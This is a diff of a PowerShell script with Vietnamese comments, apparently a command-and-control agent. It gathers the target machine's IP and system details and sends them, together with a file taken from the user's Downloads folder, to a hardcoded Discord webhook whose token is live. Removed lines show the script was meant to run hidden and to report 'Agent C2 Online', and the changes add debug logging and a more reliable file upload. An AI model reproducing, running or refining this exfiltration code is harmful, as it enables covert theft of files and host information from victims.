@@ -1,14 +1,16 @@
 $webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"
 
-# Lấy IP với fallback
+Write-Host "[*] PS: Bắt đầu thu thập thông tin..."
+
 try {
     $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
 } catch {
-    $ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null }).IPAddress[0]
+    $ipAddress = "Unknown"
+    Write-Host "[!] PS: Không lấy được IP qua Get-NetIPAddress: $($_.Exception.Message)"
 }
 
 $embed = @{
-    content = "🚀 **Agent C2 Online**"
+    content = "🚀 **Agent Debug Mode**"
     embeds = @(@{
         title = "Thông tin máy mục tiêu"
         color = 3066993
@@ -20,17 +22,45 @@ $embed = @{
     })
 } | ConvertTo-Json -Depth 5
 
-# Gửi embed (bắt lỗi nếu webhook chết)
+# --- Gửi Embed ---
 try {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $embed -ContentType "application/json"
+    Write-Host "[*] PS: Đang gửi JSON Embed tới Discord..."
+    $res = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $embed -ContentType "application/json"
+    Write-Host "[+] PS: Gửi Embed thành công."
 } catch {
-    # Không hiện lỗi ra console (vì chạy ẩn)
+    Write-Host "[-] PS: Lỗi khi gửi Embed: $($_.Exception.Message)"
 }
 
-# Gửi file abc.txt nếu có
+# --- Gửi File ---
 $filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
+Write-Host "[*] PS: Đang kiểm tra file tại: $filePath"
+
 if (Test-Path $filePath) {
     try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $filePath -ContentType "multipart/form-data"
-    } catch {}
+        Write-Host "[*] PS: Đang khởi tạo luồng upload file..."
+        $FileStream = [System.IO.File]::OpenRead($filePath)
+        $FileContent = [System.Net.Http.StreamContent]::new($FileStream)
+        $FileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+        
+        $MultipartContent = [System.Net.Http.MultipartFormDataContent]::new()
+        # "file" là key bắt buộc của Discord
+        $MultipartContent.Add($FileContent, "file", "abc.txt")
+        
+        $HttpClient = [System.Net.Http.HttpClient]::new()
+        $Response = $HttpClient.PostAsync($webhookUrl, $MultipartContent).Result
+        
+        if ($Response.IsSuccessStatusCode) {
+            Write-Host "[+] PS: Upload file abc.txt thành công!"
+        } else {
+            $errBody = $Response.Content.ReadAsStringAsync().Result
+            Write-Host "[-] PS: Discord từ chối file. Mã lỗi: $($Response.StatusCode) - $errBody"
+        }
+    } catch {
+        Write-Host "[-] PS: Lỗi nghiêm trọng khi upload: $($_.Exception.Message)"
+    } finally {
+        if ($null -ne $FileStream) { $FileStream.Dispose() }
+        if ($null -ne $HttpClient) { $HttpClient.Dispose() }
+    }
+} else {
+    Write-Host "[!] PS: KHÔNG tìm thấy file abc.txt tại đường dẫn quy định."
 }
